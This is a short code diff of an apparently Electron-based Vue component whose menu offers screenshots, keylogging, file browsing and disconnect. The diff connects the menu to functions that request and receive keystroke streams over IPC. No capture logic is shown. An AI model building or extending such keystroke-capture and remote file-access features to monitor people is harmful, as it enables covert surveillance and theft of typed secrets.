@@ -114,13 +114,14 @@ export default {
         // todo Screenshot
       }
       if (this.menus[index] === '键盘记录') {
-        this.getScreenShot()
+        this.requestKeylogger()
+
       }
       if (this.menus[index] === '文件目录') {
         this.getFile('/', 'lmy.txt')
       }
       if (this.menus[index] === '断开连接') {
-        // todo 断开连接
+        this.updateKeylogger()
       }
     },
     /**
@@ -180,7 +181,7 @@ export default {
      * @description: 请求键盘更新
      * @return {string} stream 新增的键盘输入
      */
-    requestKeylogger () {
+    updateKeylogger () {
       ipcRenderer.once('KeyloggerUpdate', (event, stream) => {
         alert('Vue:' + stream)
       })
